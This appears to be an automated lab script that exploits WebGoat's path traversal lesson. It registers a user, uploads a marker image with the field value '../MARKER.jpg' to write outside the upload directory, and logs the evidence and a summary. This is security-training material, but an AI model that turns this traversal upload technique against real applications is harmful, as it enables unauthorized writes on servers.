#!/usr/bin/env bash
set -Eeuo pipefail
WG="${WG:-http://<lab-ip>:8080/WebGoat}"
RUN_ID="webgoat_pathtraversal_upload_write_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
mkdir -p "$OUT/http" "$OUT/evidence"
J="$OUT/http/cookies.txt"
WG_USER="ptu$(date -u +%H%M%S)"
WG_PASS="webgoat"
MARKER="WG_PATH_UPLOAD_${RUN_ID}"
PAYLOAD_FILE="$OUT/evidence/marker.jpg"
printf '%s\n' "$MARKER" > "$PAYLOAD_FILE"
obs(){ python3 - "$OUT/observations.jsonl" "$@" <<'PY'
import json, sys, time
path=sys.argv[1]
obj={'ts':time.time()}
for item in sys.argv[2:]:
    k,v=item.split('=',1); obj[k]=v
with open(path,'a',encoding='utf-8') as f: f.write(json.dumps(obj,sort_keys=True)+'\n')
PY
}
PRE=$(curl -sS -m 8 -o "$OUT/http/pre_login.html" -w '%{http_code}' -c "$J" "$WG/login" || echo 000)
curl -sS -m 8 -b "$J" -c "$J" -X POST "$WG/register.mvc" -d "username=$WG_USER&password=$WG_PASS&matchingPassword=$WG_PASS&agree=agree" -o "$OUT/http/register.html" >/dev/null
LOGIN=$(curl -sS -m 8 -b "$J" -c "$J" -X POST "$WG/login" -d "username=$WG_USER&password=$WG_PASS" -o "$OUT/http/login_post.html" -w '%{http_code}' || echo 000)
LESSON=$(curl -sS -m 8 -b "$J" -c "$J" "$WG/PathTraversal.lesson" -o "$OUT/http/PathTraversal.lesson.html" -w '%{http_code}' || echo 000)
JS=$(curl -sS -m 8 -b "$J" -c "$J" "$WG/lesson_js/path_traversal.js" -o "$OUT/http/path_traversal.js" -w '%{http_code}' || echo 000)
CONTROL=$(curl -sS -m 10 -b "$J" -c "$J" -X POST "$WG/PathTraversal/profile-upload" \
  -F "uploadedFile=@$PAYLOAD_FILE;type=image/jpeg;filename=control.jpg" \
  -F "fullName=control.jpg" \
  -F "email=test@test.com" -F "password=test" \
  -o "$OUT/evidence/control_upload.json" -w '%{http_code}' || echo 000)
TRAVERSAL_NAME="../${MARKER}.jpg"
TRAVERSAL=$(curl -sS -m 10 -b "$J" -c "$J" -X POST "$WG/PathTraversal/profile-upload" \
  -F "uploadedFile=@$PAYLOAD_FILE;type=image/jpeg;filename=marker.jpg" \
  -F "fullName=$TRAVERSAL_NAME" \
  -F "email=test@test.com" -F "password=test" \
  -o "$OUT/evidence/traversal_upload.json" -w '%{http_code}' || echo 000)
PROFILE=$(curl -sS -m 8 -b "$J" -c "$J" "$WG/PathTraversal/profile-picture" -o "$OUT/evidence/profile_picture_base64.txt" -w '%{http_code}' || echo 000)
POST=$(curl -sS -m 8 -o "$OUT/http/post_login.html" -w '%{http_code}' -b "$J" "$WG/login" || echo 000)
TRAV_SUCCESS=no
if grep -q 'lessonCompleted" : true' "$OUT/evidence/traversal_upload.json" || grep -q 'lessonCompleted":true' "$OUT/evidence/traversal_upload.json"; then TRAV_SUCCESS=yes; fi
obs category=path_traversal_upload route=<attacker-vm>-v2_to_kali-victim-lab target="$WG" pre_health="$PRE" login_status="$LOGIN" lesson_status="$LESSON" js_status="$JS" control_status="$CONTROL" traversal_status="$TRAVERSAL" traversal_success="$TRAV_SUCCESS" profile_status="$PROFILE" post_health="$POST" report_readiness=local_learning destructive_lab=bounded_file_write
cat > "$OUT/summary.md" <<EOF
# WebGoat Path Traversal Upload File-Write Wave

run_id: $RUN_ID
target: $WG
user: $WG_USER
marker: $MARKER
pre_health: $PRE
login_status: $LOGIN
lesson_status: $LESSON
js_status: $JS
control_upload_status: $CONTROL
traversal_upload_status: $TRAVERSAL
traversal_success: $TRAV_SUCCESS
profile_picture_status: $PROFILE
post_health: $POST

## Evidence
- control upload response: evidence/control_upload.json
- traversal upload response: evidence/traversal_upload.json
- payload marker file: evidence/marker.jpg
- profile-picture check: evidence/profile_picture_base64.txt
- source lesson: http/PathTraversal.lesson.html
- client JS: http/path_traversal.js
- observations: observations.jsonl

## Impact boundary
This is an authorized local-lab path traversal file-write proof. It writes a lab marker image filename outside the per-user upload directory but still inside WebGoat's local PathTraversal lab directory. No system files, secrets, persistence, shell, public target, or credential theft.

## Cleanup/recovery
WebGoat health stayed $POST after the run; no VM restore was required. If state cleanup is desired, reset/restart the WebGoat container or restore the victim VM snapshot.
EOF
if [ "$TRAV_SUCCESS" = yes ] && [ "$POST" = 200 ]; then echo "$OUT"; exit 0; fi
echo "$OUT"; exit 4
